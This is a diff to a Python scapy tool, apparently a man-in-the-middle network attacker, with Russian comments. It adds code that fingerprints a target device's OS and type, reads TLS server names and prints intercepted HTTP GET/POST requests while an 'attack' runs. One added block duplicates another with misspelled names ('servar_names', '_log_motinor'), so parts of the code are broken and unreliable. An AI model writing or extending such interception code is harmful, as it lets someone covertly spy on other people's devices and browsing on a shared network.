@@ -1,3 +1,5 @@
+import urllib
+
 import scapy.all as scapy
 import os
 import socket
@@ -7,19 +9,20 @@ import ctypes
 from threading import Thread
 from collections import Counter
 
+from mac_vendor_lookup import MacLookup
 from scapy.layers.dns import DNSQR
+from scapy.layers.tls.all import TLS
 from scapy.layers.l2 import ARP, Ether
 from scapy.sendrecv import srp, sendp, sniff, send
 from scapy.arch import get_if_addr
 from scapy.all import conf
-from scapy.layers.inet import ICMP, IP
+from scapy.layers.inet import ICMP, IP, TCP
 
 
 class NetworkTool:
     def __init__(self):
         self.my_ip = get_if_addr(conf.iface)
         self.my_mac = conf.iface.mac
-
         self.router_ip = self._get_gateway_ip()
         self.router_mac = self._get_mac(self.router_ip)
         self.network_range = ".".join(self.my_ip.split(".")[:-1]) + ".0/24"
@@ -53,15 +56,41 @@ class NetworkTool:
         if self.on_monitor_log: self.on_monitor_log(msg)
         else: print(f"[MONITOR] {msg}")
 
+    def get_vendor_pro(self, mac):
+        """Синхронный и надежный метод без конфликтов потоков"""
+        # 1. Быстрый локальный кэш для самых частых (чтобы не спамить API)
+        prefix = mac.lower()[:8]
+        common = {
+            "4c:a9:19": "Xiaomi", "54:6c:eb": "Samsung", "6a:35:9a": "Apple",
+            "00:0c:29": "VMware", "b8:27:eb": "Raspberry"
+        }
+        if prefix in common:
+            return common[prefix]
+
+        # 2. Безопасный синхронный запрос к API
+        try:
+            url = f"https://api.macvendors.com/{mac}"
+            req = urllib.request.Request(url, headers={'User-Agent': 'Mozilla/5.0'})
+            with urllib.request.urlopen(req, timeout=2) as response:
+                return response.read().decode('utf-8')
+        except:
+            return "Unknown Device"
+
+
     def update_devices(self):
         ans = srp(Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=self.network_range), timeout=3, retry=2, verbose=0)[0]
         devs = []
+
         for _, r in ans:
             if r.psrc != self.my_ip and r.psrc != self.router_ip:
                 try:
                     name = socket.gethostbyaddr(r.psrc)[0]
                 except:
-                    name = "Unknown Device"
+                    name = self.get_vendor_pro(r.hwsrc)
+
+                if name == "Unknown device" and r.hwsrc[1].lower() in ['2', '6', 'a', 'e']:
+                    name = "Private/Random MAC"
+
                 devs.append({'ip': r.psrc, 'mac': r.hwsrc, 'name': name})
         self.found_devices = devs
 
@@ -151,6 +180,54 @@ class NetworkTool:
 
         def packet_callback(pkt):
             if not self.is_attacking: return
+            t_ip = self.target_info['ip']
+
+            if pkt.haslayer(IP) and pkt[IP].src == t_ip:
+                ttl = pkt[IP].ttl
+                if 'os' not in self.target_info:
+                    if ttl <= 64: self.target_info['os'] = "Linux/Android/iOS"
+                    elif ttl <= 128: self.target_info['os'] = "Windows"
+                    self.target_info['packets'] += 1
+                    self._log_monitor(f"ℹ️ ОС цели определена как: {self.target_info['os']}")
+
+                    # АНАЛИЗАТОР МОДЕЛИ (внутри packet_callback)
+                    payload = str(pkt.getlayer(DNSQR)) if pkt.haslayer(DNSQR) else ""
+                    detected_model = None
+
+                    # 1. Ищем специфические домены
+                    if "apple.com" in payload or "icloud.com" in payload:
+                        detected_model = "Apple Device"
+                    elif "android.clients.google.com" in payload or "play.googleapis.com" in payload:
+                        detected_model = "Android Smartphone"
+                    elif "windowsupdate.com" in payload or "msedge.net" in payload:
+                        detected_model = "Windows PC"
+
+                    # 2. Если нашли модель и еще не объявляли о ней
+                    if detected_model and 'model_announced' not in self.target_info:
+                        self.target_info['model'] = detected_model
+                        self.target_info['model_announced'] = True
+
+                        # Пишем в правый терминал
+                        self._log_monitor(f"📱 ТИП УСТРОЙСТВА ОПРЕДЕЛЕН: {detected_model}")
+
+                        # ОБНОВЛЯЕМ ИМЯ В ТАБЛИЦЕ!
+                        for d in self.found_devices:
+                            if d['ip'] == t_ip:
+                                # Приписываем модель к текущему имени
+                                d['name'] = f"[{detected_model}] {d['name'].replace('Unknown Device', '')}".strip()
+                                break
+
+            if pkt.haslayer(IP) and pkt.haslayer(TCP) and pkt[TCP].dport == 443:
+                if pkt.haslayer(TLS):
+                    try:
+                        # Поправлено: server_names и _log_monitor
+                        server_name = pkt[TLS].msg[0].ext[0].server_names[0].hostname.decode()
+                        if server_name not in self.query_log:
+                            self.query_log.append(server_name)
+                            self._log_monitor(f"🔒 HTTPS СОЕДИНЕНИЕ: {server_name}")
+                    except:
+                        pass
+
             if pkt.haslayer(DNSQR):
                 query = pkt[DNSQR].qname.decode(errors='ignore').strip('.')
 
@@ -167,10 +244,27 @@ class NetworkTool:
                     t_str = time.strftime("%H:%M:%S")
                     self._log_monitor(f"[{t_str}] ЦЕЛЬ ПЕРЕШЛА: {query}")
 
+            if pkt.haslayer(IP) and pkt.haslayer(TCP) and pkt[TCP].dport == 443:
+                if pkt.haslayer(TLS):
+                    try:
+                        server_name = pkt[TLS].msg[0].ext[0].servar_names[0].hostname.decode()
+                        if server_name not in self.query_log:
+                            self.query_log.append(server_name)
+                            self._log_motinor(f"🔒 HTTPS СОЕДИНЕНИЕ: {server_name}")
+                    except:
+                        pass
+
+            if pkt.haslayer(IP) and pkt[IP].src == t_ip:
+                self.target_info['packets'] += 1
+                if len(pkt) > 1000:
+                    pass
+
             if pkt.haslayer(IP) and pkt.haslayer("Raw"):
                 payload = pkt["Raw"].load.decode(errors='ignore')
                 if "GET" in payload or "POST" in payload:
                     self._log_monitor(f"\n[!] ПЕРЕХВАЧЕН HTTP ЗАПРОС:\n{payload[:200]}")
+
+
 
         # Сниффер в отдельном потоке
         Thread(target=lambda: sniff(filter=f"host {t_ip} and udp port 53", prn=packet_callback, store=0),
